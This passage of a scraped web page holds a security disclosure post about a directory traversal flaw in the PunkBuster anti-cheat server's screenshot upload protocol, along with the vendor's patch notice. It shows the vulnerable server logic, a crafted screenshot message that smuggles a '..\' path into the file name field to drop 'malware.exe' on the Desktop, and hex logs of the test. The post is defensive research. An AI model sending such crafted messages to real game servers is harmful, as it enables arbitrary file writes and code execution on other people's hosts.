seconds.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":173,"end":174,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_26":{"__typename":"Paragraph","id":"5b1d91643f0b_26","name":"fcc6","type":"H3","href":null,"layout":null,"metadata":null,"text":"Screenshot Hello World","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_27":{"__typename":"Paragraph","id":"5b1d91643f0b_27","name":"1938","type":"P","href":null,"layout":null,"metadata":null,"text":"Without getting into too much details about the protocol, suffice to say that when an admin wants to get a screenshot from a client, either manually or because x amount of seconds passed since the last screenshot, it sends the client a message in a format we will explain later in the post.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":160,"end":161,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_28":{"__typename":"Paragraph","id":"5b1d91643f0b_28","name":"7f0c","type":"P","href":null,"layout":null,"metadata":null,"text":"Consider the following log which was captured on the internals of the server side of Battlefield 4 (after the 2 decoding processes) for this research:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":85,"end":98,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_29":{"__typename":"Paragraph","id":"5b1d91643f0b_29","name":"3583","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Msg FROM slot #-1\n00000000 | 70 62 5f 73 76 5f 67 65 | pb_sv_ge\n00000008 | 74 73 73 20 31          | tss 1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_30":{"__typename":"Paragraph","id":"5b1d91643f0b_30","name":"e954","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Msg TO   slot #0\n00000000 | 49 30 20 31 32 39 34 36 | I0 12946\n00000008 | 38 39 37 35 34 20 31 20 | 89754 1\n00000010 | 33 32 30 20 32 34 30 20 | 320 240\n00000018 | 35 30 20 35 30 20 31 00 | 50 50 1.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_31":{"__typename":"Paragraph","id":"5b1d91643f0b_31","name":"70da","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Msg FROM slot #0\n00000000 | 47 31 34 34 33 38 30 20 | G144380\n00000008 | 43 31 44 36 36 39 39 41 | C1D6699A\n00000010 | 45 34 42 31 45 42 34 31 | E4B1EB41\n00000018 | 37 38 43 35 45 36 46 35 | 78C5E6F5\n00000020 | 45 41 42 38 30 46 35 39 | EAB80F59\n00000028 | 20 41 70 62 30 30 30 30 |  Apb0000\n00000030 | 30 31 2e 70 6e 67 00    | 01.png.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_32":{"__typename":"Paragraph","id":"5b1d91643f0b_32","name":"6667","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Msg FROM slot #0\n00000000 | 48 00 00 41 89 50 4e 47 | H..A.PNG\n00000008 | 0d 0a 1a 0a 00 00 00 0d | ........\n00000010 | 49 48 44 52 00 00 02 2e | IHDR....\n00000018 | 00 00 01 32 08 02 00 00 | ...2....\n00000020 | 00 52 d4 cc f5 00 00 00 | .R......\n00000028 | e6 74 45 58 74 63 6f 6d | .tEXtcom\n00000030 | 6d 65 6e 74 00 50 75 6e | ment.Pun\n00000038 | 6b 42 75 73 74 65 72 20 | kBuster\n00000040 | 53 63 72 65 65 6e 73 68 | Screensh\n00000048 | 6f 74 20 28 f1 29 20 42 | ot (.) B\n00000050 | 46 34 20 20 4c 65 76 65 | F4  Leve\n00000058 | 6c 73 2f 4d 50 2f 4d 50 | ls\u002FMP\u002FMP\n00000060 | 5f 41 62 61 6e 64 6f 6e | _Abandon\n00000068 | 65 64 2f 4d 50 5f 41 62 | ed\u002FMP_Ab\n00000070 | 61 6e 64 6f 6e 65 64 0a | andoned.\n...\n...\n...","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_33":{"__typename":"Paragraph","id":"5b1d91643f0b_33","name":"41f5","type":"P","href":null,"layout":null,"metadata":null,"text":"Lets go over this line by line. First the server received, from slot #-1 (RCON admin) a request to take a screenshot from client on slot 1:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":69,"end":72,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":137,"end":138,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_34":{"__typename":"Paragraph","id":"5b1d91643f0b_34","name":"5836","type":"PRE","href":null,"layout":null,"metadata":null,"text":"pb_sv_getss 1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_35":{"__typename":"Paragraph","id":"5b1d91643f0b_35","name":"4c9f","type":"P","href":null,"layout":null,"metadata":null,"text":"The server then sends the following message to slot 1:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":52,"end":53,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_36":{"__typename":"Paragraph","id":"5b1d91643f0b_36","name":"1f90","type":"PRE","href":null,"layout":null,"metadata":null,"text":"I0 1294689754 1 320 240 50 50 1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_37":{"__typename":"Paragraph","id":"5b1d91643f0b_37","name":"c327","type":"P","href":null,"layout":null,"metadata":null,"text":"This is the screenshot message. The format of that message is the following:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_38":{"__typename":"Paragraph","id":"5b1d91643f0b_38","name":"14dc","type":"PRE","href":null,"layout":null,"metadata":null,"text":"I[delay] [rand] [file_id] [width] [height] [x] [y] [rate]","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_39":{"__typename":"Paragraph","id":"5b1d91643f0b_39","name":"144b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"[delay] = Maximum delay client waits before capturing screenshot\n[rand] = Random identifier, basically the ID of the screenshot\n[file_id] = The file name of the screenshot by the format pb%06.png\n[width] = The requested width, in pixels, of the screenshot\n[height] = The requested height, in pixels, of the screenshot\n[x] = The horizontal center of the screenshot, in %\n[y] = The vertical center of the screenshot, in %\n[rate] = The rate the server will receive the screenshot in kb\u002Fs","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_40":{"__typename":"Paragraph","id":"5b1d91643f0b_40","name":"c6e6","type":"P","href":null,"layout":null,"metadata":null,"text":"Most of those variables can be configured with the following punkbuster server commands:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_41":{"__typename":"Paragraph","id":"5b1d91643f0b_41","name":"e7e7","type":"PRE","href":null,"layout":null,"metadata":null,"text":"pb_sv_SsWidth 320 \u002F\u002FRequested pixel width of remote screenshots\npb_sv_SsHeight 240 \u002F\u002FRequested pixel height of remote screenshots\npb_sv_SsXpct 50 \u002F\u002FPercentage across screen for remote screenshots\npb_sv_SsYpct 50 \u002F\u002FPercentage down screen for remote screenshots\npb_sv_SsSrate 1 \u002F\u002FSample Rate for remote screenshots\npb_sv_SsDelay 0 \u002F\u002FMaximum delay client waits before capturing screenshot","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_42":{"__typename":"Paragraph","id":"5b1d91643f0b_42","name":"adae","type":"P","href":null,"layout":null,"metadata":null,"text":"Back to the log. After the server sends the client the screenshot request the client answers with the following message after capturing the screenshot:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_43":{"__typename":"Paragraph","id":"5b1d91643f0b_43","name":"d5c7","type":"PRE","href":null,"layout":null,"metadata":null,"text":"G144380 C1D6699AE4B1EB4178C5E6F5EAB80F59 Apb000001.png","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_44":{"__typename":"Paragraph","id":"5b1d91643f0b_44","name":"456f","type":"P","href":null,"layout":null,"metadata":null,"text":"This format is much simpler:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_45":{"__typename":"Paragraph","id":"5b1d91643f0b_45","name":"2639","type":"PRE","href":null,"layout":null,"metadata":null,"text":"G[size] [md5] [letter][pb%06.png]","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_46":{"__typename":"Paragraph","id":"5b1d91643f0b_46","name":"d2a6","type":"PRE","href":null,"layout":null,"metadata":null,"text":"[size] = The size of the screenshot, in bytes\n[md5] = MD5 hash of the screenshot data\n[letter] = Screenshot counter, A for 1st, B for 2nd etc\n[pb%06.png] = Screenshot name, [file_id] is taken from the server request","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_47":{"__typename":"Paragraph","id":"5b1d91643f0b_47","name":"8170","type":"P","href":null,"layout":null,"metadata":null,"text":"After this header you can see the client begin transferring the screenshot data, note the PNG magic string on the last message from the client.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":90,"end":93,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_48":{"__typename":"Paragraph","id":"5b1d91643f0b_48","name":"51d9","type":"H3","href":null,"layout":null,"metadata":null,"text":"The Problem","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_49":{"__typename":"Paragraph","id":"5b1d91643f0b_49","name":"51c5","type":"P","href":null,"layout":null,"metadata":null,"text":"Some of you may have already noticed the possible problem here. The server tells the client the file_id for the screenshot but then the client actually tells the server the screenshot name! This is, of-course, not a problem on its own, because the server can still handle malicious file names on its side.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":96,"end":103,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":132,"end":142,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_50":{"__typename":"Paragraph","id":"5b1d91643f0b_50","name":"7735","type":"P","href":null,"layout":null,"metadata":null,"text":"But in this case — it didn’t.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_51":{"__typename":"Paragraph","id":"5b1d91643f0b_51","name":"1db5","type":"P","href":null,"layout":null,"metadata":null,"text":"Consider the following code which is a simplified version of the server’s code:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_52":{"__typename":"Paragraph","id":"5b1d91643f0b_52","name":"0252","type":"PRE","href":null,"layout":null,"metadata":null,"text":"char ssPath[0x100];\n\u002F\u002F clientMsg = \"104553 8E4B1C2F39151F72E364E461FB43F931 Apb000001.png\";\nint ssSize = stoi(GetParamBySpace(clientMsg, 0));\nchar *ssHash = GetParamBySpace(clientMsg, 1);\n\u002F\u002F Add 1 to remove the ss counter, A in this case\nchar *ssFileName = GetParamBySpace(clientMsg, 2) + 1; \nif (!strnicmp(&ssFileName[strlen(ssFileName) - 3], \"png\", 3)) {\n \u002F\u002F ssFileName indeed ends with png\n \u002F\u002F Do some checks against trivial directory traversal attacks\n \u002F\u002F like search for \"\u002F\u002F\" and \"..\" and then cat \n \u002F\u002F the filename to \\\\svss\\\\ in the pb folder\n \u002F\u002F eventually do something like:\n sprintf(ssPath, \"%s\\\\svss\\\\%s\", pbMasterFolderPath, ssFileName);\n} else { \u002F\u002F \u003C- Problem is here\n \u002F\u002F No checks for directory traversal attacks in this branch\n sprintf(ssPath, \"%s\\\\svss\\\\%s\", pbMasterFolderPath, ssFileName);\n}\n…\n…\n…\nssFileData = malloc(ssSize);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_53":{"__typename":"Paragraph","id":"5b1d91643f0b_53","name":"45f8","type":"H3","href":null,"layout":null,"metadata":null,"text":"Exploiting the Bug","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_54":{"__typename":"Paragraph","id":"5b1d91643f0b_54","name":"335b","type":"P","href":null,"layout":null,"metadata":null,"text":"At this point it is pretty obvious what one needs to do in order to exploit this bug. An attacker can simply modify the file name so it won’t end with a png, passing all the directory traversal mitigations Punkbuster implemented, basically gaining the ability to write any file to anywhere in the server’s filesystem.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_55":{"__typename":"Paragraph","id":"5b1d91643f0b_55","name":"5ca1","type":"P","href":null,"layout":null,"metadata":null,"text":"We crafted the following screenshot message:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_56":{"__typename":"Paragraph","id":"5b1d91643f0b_56","name":"70f2","type":"PRE","href":null,"layout":null,"metadata":null,"text":"G22 86FCCBBB45E7AB6CFB84B295B4F29360 ..\\..\\..\\..\\..\\Desktop\\malware.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_57":{"__typename":"Paragraph","id":"5b1d91643f0b_57","name":"cdd8","type":"P","href":null,"layout":null,"metadata":null,"text":"With the following file’s data:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_58":{"__typename":"Paragraph","id":"5b1d91643f0b_58","name":"f6d1","type":"PRE","href":null,"layout":null,"metadata":null,"text":"MZ___EVIL_MALWARE_DATA","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_59":{"__typename":"Paragraph","id":"5b1d91643f0b_59","name":"470c","type":"P","href":null,"layout":null,"metadata":null,"text":"Note that we had to provide a correct MD5 for that data or otherwise the server will just drop the message.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_60":{"__typename":"Paragraph","id":"5b1d91643f0b_60","name":"4168","type":"P","href":null,"layout":null,"metadata":null,"text":"The following log represents the server side when we tested such an attack:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_61":{"__typename":"Paragraph","id":"5b1d91643f0b_61","name":"7766","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Msg FROM slot #-1\n00000000 | 70 62 5f 73 76 5f 67 65 | pb_sv_ge\n00000008 | 74 73 73 20 31          | tss 1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_62":{"__typename":"Paragraph","id":"5b1d91643f0b_62","name":"f498","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Msg TO   slot #0\n00000000 | 49 30 20 38 30 31 31 31 | I0 80111\n00000008 | 33 31 32 36 20 32 20 33 | 3126 2 3\n00000010 | 32 30 20 32 34 30 20 35 | 20 240 5\n00000018 | 30 20 35 30 20 31 00    | 0 50 1.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_63":{"__typename":"Paragraph","id":"5b1d91643f0b_63","name":"f00b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Msg FROM slot #0\n00000000 | 47 32 32 20 38 36 46 43 | G22 86FC\n00000008 | 43 42 42 42 34 35 45 37 | CBBB45E7\n00000010 | 41 42 36 43 46 42 38 34 | AB6CFB84\n00000018 | 42 32 39 35 42 34 46 32 | B295B4F2\n00000020 | 39 33 36 30 20 2e 2e 5c | 9360 ..\\\n00000028 | 2e 2e 5c 2e 2e 5c 2e 2e | ..\\..\\..\n00000030 | 5c 2e 2e 5c 44 65 73 6b | \\..\\Desk\n00000038 | 74 6f 70 5c 6d 61 6c 77 | top\\malw\n00000040 | 61 72 65 2e 65 78 65 00 | are.exe.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_64":{"__typename":"Paragraph","id":"5b1d91643f0b_64","name":"5ee3","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Msg FROM slot #0\n00000000 | 48 00 00 2e 4d 5a 5f 5f | H...MZ__\n00000008 | 5f 45 56 49 4c 5f 4d 41 | _EVIL_MA\n00000010 | 4c 57 41 52 45 5f 44 41 | LWARE_DA\n00000018 | 54 41                   | TA","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_65":{"__typename":"Paragraph","id":"5b1d91643f0b_65","name":"984b","type":"P","href":null,"layout":null,"metadata":null,"text":"And indeed, malware.exe was written to the Desktop, far far away from the Punkbuster folder:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":12,"end":23,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*Yl7DLaCFVsViu8gV":{"__typename":"ImageMetadata","id":"0*Yl7DLaCFVsViu8gV","originalHeight":200,"originalWidth":1038,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:5b1d91643f0b_66":{"__typename":"Paragraph","id":"5b1d91643f0b_66","name":"6f8a","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*Yl7DLaCFVsViu8gV"},"text":"procmon showing malware.exe was written to the user’s Desktop","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_67":{"__typename":"Paragraph","id":"5b1d91643f0b_67","name":"8641","type":"P","href":null,"layout":null,"metadata":null,"text":"As an attacker you don’t actually need to wait for the server to ask for a screenshot and can just send the relevant data as it was requested and it will still be received on the server. Mind that exploiting this vulnerability might not be that easy, as the client side, which is the part needed to actually achieve that, is heavily obfuscated.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_68":{"__typename":"Paragraph","id":"5b1d91643f0b_68","name":"7ff1","type":"H3","href":null,"layout":null,"metadata":null,"text":"Applications","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_69":{"__typename":"Paragraph","id":"5b1d91643f0b_69","name":"7ab8","type":"P","href":null,"layout":null,"metadata":null,"text":"The ability to write any file anywhere is practically a remote code execution because an attacker can obviously just overwrite modules that get loaded frequently which will load the attacker’s code.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_70":{"__typename":"Paragraph","id":"5b1d91643f0b_70","name":"a585","type":"P","href":null,"layout":null,"metadata":null,"text":"Punkbuster might be old but there are many servers using its service to this day. It is important to remember that these servers are not cheap. Those are gaming servers with expensive hardware that can be a jackpot for hackers to install miners on.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_71":{"__typename":"Paragraph","id":"5b1d91643f0b_71","name":"6075","type":"P","href":null,"layout":null,"metadata":null,"text":"Sensitive information might be on those servers because usually only the hosting company staff have access to them.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_72":{"__typename":"Paragraph","id":"5b1d91643f0b_72","name":"046f","type":"P","href":null,"layout":null,"metadata":null,"text":"This can also lead to a bigger attack from inside the network.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_73":{"__typename":"Paragraph","id":"5b1d91643f0b_73","name":"626c","type":"H3","href":null,"layout":null,"metadata":null,"text":"Even Balance Response","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_74":{"__typename":"Paragraph","id":"5b1d91643f0b_74","name":"3db7","type":"P","href":null,"layout":null,"metadata":null,"text":"Tony from Even Balance was quick to respond. He thanked us and assured Even Balance will address this vulnerability right away.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_75":{"__typename":"Paragraph","id":"5b1d91643f0b_75","name":"7664","type":"P","href":null,"layout":null,"metadata":null,"text":"A few days ago a new patch (1.905) was released that supposedly addresses this issue. All servers that are running Punkbuster will automatically download the new version.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":28,"end":33,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_76":{"__typename":"Paragraph","id":"5b1d91643f0b_76","name":"7367","type":"P","href":null,"layout":null,"metadata":null,"text":"We offered our help with addressing this issue and asked that the fixing process will be collaborated with us but Even Balance chose not to do that (which is completely fine, of-course), so we can’t be responsible that the fix actually addresses the issue well.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_77":{"__typename":"Paragraph","id":"5b1d91643f0b_77","name":"225d","type":"P","href":null,"layout":null,"metadata":null,"text":"With that being said, we did test our old exploit against the new version and it didn’t work. We didn’t actually reverse and BinDiffed the new patch, so we can’t be absolutely sure it isn’t exploitable anymore, but from a superficial examination it seems that the issue has been fixed.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":25,"end":28,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":165,"end":175,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_78":{"__typename":"Paragraph","id":"5b1d91643f0b_78","name":"a8d2","type":"P","href":null,"layout":null,"metadata":null,"text":"Even Balance also posted the following message on their website:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_79":{"__typename":"Paragraph","id":"5b1d91643f0b_79","name":"8490","type":"PRE","href":null,"layout":null,"metadata":null,"text":"A serious security (remote code execution) flaw involving PunkBuster was recently discovered and reported. An attacker with knowledge of the flaw can exploit it by replacing any unprotected (non-read-only) executable file with the attacker's provided file, even outside the \"pb\" subdirectory, thus compromising the game server's host environment. This flaw does not affect player installations nor the PunkBuster client. New PB Server version v1.905 which addresses the flaw has been released for all supported games via our auto-update system and for use by the PBSETUP stand-alone tool. Server administrators running a PB Server version prior to version 1.905 for any game should disable PunkBuster on their game server(s). Thanks to Daniel Prizmant at Palo Alto Networks for discovering the flaw and reporting it to us in a professional manner.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"UserViewerEdge:userId:6accd23011ad-viewerId:lo_2246cba9c8b2":{"__typename":"UserViewerEdge","id":"userId:6accd23011ad-viewerId:lo_2246cba9c8b2","isMuting":false},"PostViewerEdge:postId:e22e6cf2f36e-viewerId:lo_2246cba9c8b2":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:e22e6cf2f36e-viewerId:lo_2246cba9c8b2"},"Post:e22e6cf2f36e":{"__typename":"Post","id":"e22e6cf2f36e","collection":null,"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"e846","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:5b1d91643f0b_0"},{"__ref":"Paragraph:5b1d91643f0b_1"},{"__ref":"Paragraph:5b1d91643f0b_2"},{"__ref":"Paragraph:5b1d91643f0b_3"},{"__ref":"Paragraph:5b1d91643f0b_4"},{"__ref":"Paragraph:5b1d91643f0b_5"},{"__ref":"Paragraph:5b1d91643f0b_6"},{"__ref":"Paragraph:5b1d91643f0b_7"},{"__ref":"Paragraph:5b1d91643f0b_8"},{"__ref":"Paragraph:5b1d91643f0b_9"},{"__ref":"Paragraph:5b1d91643f0b_10"},{"__ref":"Paragraph:5b1d91643f0b_11"},{"__ref":"Paragraph:5b1d91643f0b_12"},{"__ref":"Paragraph:5b1d91643f0b_13"},{"__ref":"Paragraph:5b1d91643f0b_14"},{"__ref":"Paragraph:5b1d91643f0b_15"},{"__ref":"Paragraph:5b1d91643f0b_16"},{"__ref":"Paragraph:5b1d91643f0b_17"},{"__ref":"Paragraph:5b1d91643f0b_18"},{"__ref":"Paragraph:5b1d91643f0b_19"},{"__ref":"Paragraph:5b1d91643f0b_20"},{"__ref":"Paragraph:5b1d91643f0b_21"},{"__ref":"Paragraph:5b1d91643f0b_22"},{"__ref":"Paragraph:5b1d91643f0b_23"},{"__ref":"Paragraph:5b1d91643f0b_24"},{"__ref":"Paragraph:5b1d91643f0b_25"},{"__ref":"Paragraph:5b1d91643f0b_26"},{"__ref":"Paragraph:5b1d91643f0b_27"},{"__ref":"Paragraph:5b1d91643f0b_28"},{"__ref":"Paragraph:5b1d91643f0b_29"},{"__ref":"Paragraph:5b1d91643f0b_30"},{"__ref":"Paragraph:5b1d91643f0b_31"},{"__ref":"Paragraph:5b1d91643f0b_32"},{"__ref":"Paragraph:5b1d91643f0b_33"},{"__ref":"Paragraph:5b1d91643f0b_34"},{"__ref":"Paragraph:5b1d91643f0b_35"},{"__ref":"Paragraph:5b1d91643f0b_36"},{"__ref":"Paragraph:5b1d91643f0b_37"},{"__ref":"Paragraph:5b1d91643f0b_38"},{"__ref":"Paragraph:5b1d91643f0b_39"},{"__ref":"Paragraph:5b1d91643f0b_40"},{"__ref":"Paragraph:5b1d91643f0b_41"},{"__ref":"Paragraph:5b1d91643f0b_42"},{"__ref":"Paragraph:5b1d91643f0b_43"},{"__ref":"Paragraph:5b1d91643f0b_44"},{"__ref":"Paragraph:5b1d91643f0b_45"},{"__ref":"Paragraph:5b1d91643f0b_46"},{"__ref":"Paragraph:5b1d91643f0b_47"},{"__ref":"Paragraph:5b1d91643f0b_48"},{"__ref":"Paragraph:5b1d91643f0b_49"},{"__ref":"Paragraph:5b1d91643f0b_50"},{"__ref":"Paragraph:5b1d91643f0b_51"},{"__ref":"Paragraph:5b1d91643f0b_52"},{"__ref":"Paragraph:5b1d91643f0b_53"},{"__ref":"Paragraph:5b1d91643f0b_54"},{"__ref":"Paragraph:5b1d91643f0b_55"},{"__ref":"Paragraph:5b1d91643f0b_56"},{"__ref":"Paragraph:5b1d91643f0b_57"},{"__ref":"Paragraph:5b1d91643f0b_58"},{"__ref":"Paragraph:5b1d91643f0b_59"},{"__ref":"Paragraph:5b1d91643f0b_60"},{"__ref":"Paragraph:5b1d91643f0b_61"},{"__ref":"Paragraph:5b1d91643f0b_62"},{"__ref":"Paragraph:5b1d91643f0b_63"},{"__ref":"Paragraph:5b1d91643f0b_64"},{"__ref":"Paragraph:5b1d91643f0b_65"},{"__ref":"Paragraph:5b1d91643f0b_66"},{"__ref":"Paragraph:5b1d91643f0b_67"},{"__ref":"Paragraph:5b1d91643f0b_68"},{"__ref":"Paragraph:5b1d91643f0b_69"},{"__ref":"Paragraph:5